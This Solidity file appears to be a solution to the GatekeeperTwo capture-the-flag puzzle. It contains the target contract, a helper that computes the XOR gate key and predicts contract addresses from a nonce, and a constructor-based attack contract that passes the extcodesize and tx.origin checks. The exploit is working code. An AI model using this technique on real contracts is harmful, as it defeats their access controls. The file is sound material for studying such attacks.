pragma solidity ^0.4.18;

contract GatekeeperTwo {

    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint x;
        assembly { x := extcodesize(caller) }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperTwoHelper {

    address public entrant;
    event Info(uint x);

    modifier gateOne() {
        require(msg.sender == tx.origin);
        _;
    }

    modifier gateTwo() {
        uint x;
        uint y;
        assembly { y := caller }
        assembly { x := extcodesize(caller) }
        Info(x);
        Info(y);
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
        _;
    }

    function enter1(bytes8 _gateKey) public gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }

    function enter2() public gateTwo returns (bool) {
        entrant = tx.origin;
        return true;
    }

    function enter3(bytes8 _gateKey) public gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }

    function f1() public view returns (address) {
        return msg.sender;
    }

    function f2() public view returns (uint64) {
        return uint64(keccak256(msg.sender));
    }

    function f3(bytes8 _gateKey) public pure returns (uint64) {
        return uint64(_gateKey);
    }

    function f4() public pure returns (uint64) {
        return uint64(0) - 1;
    }

    function f5(address x) public view returns (uint64) {
        return uint64(keccak256(x)) ^ (uint64(0) - 1);
    }

    function f6(address x) public pure returns (bytes32) {
        return keccak256(x);
    }

    function addressFrom(address _origin, uint _nonce) public pure returns (address) {
        if(_nonce == 0x00)     return address(keccak256(byte(0xd6), byte(0x94), _origin, byte(0x80)));
        if(_nonce <= 0x7f)     return address(keccak256(byte(0xd6), byte(0x94), _origin, byte(_nonce)));
        if(_nonce <= 0xff)     return address(keccak256(byte(0xd7), byte(0x94), _origin, byte(0x81), uint8(_nonce)));
        if(_nonce <= 0xffff)   return address(keccak256(byte(0xd8), byte(0x94), _origin, byte(0x82), uint16(_nonce)));
        if(_nonce <= 0xffffff) return address(keccak256(byte(0xd9), byte(0x94), _origin, byte(0x83), uint24(_nonce)));
        return address(keccak256(byte(0xda), byte(0x94), _origin, byte(0x84), uint32(_nonce))); // more than 2^32 nonces not realistic
    }
}

/*

Deploy GatekeeperTwoHelper

nonce = web3.eth.getTransactionCount(address, (x, y) => alert(y))
newContractAddress = addressFrom(address, nonce + 1)

_gateKey = f5(newContractAddress)

AttackGatekeeperTwoReal(target, _gateKey)

*/
contract AttackGatekeeperTwoReal {
    function AttackGatekeeperTwoReal(address target, bytes8 _gateKey) public {
        GatekeeperTwo g = GatekeeperTwo(target);
        g.enter(_gateKey);
    }
}
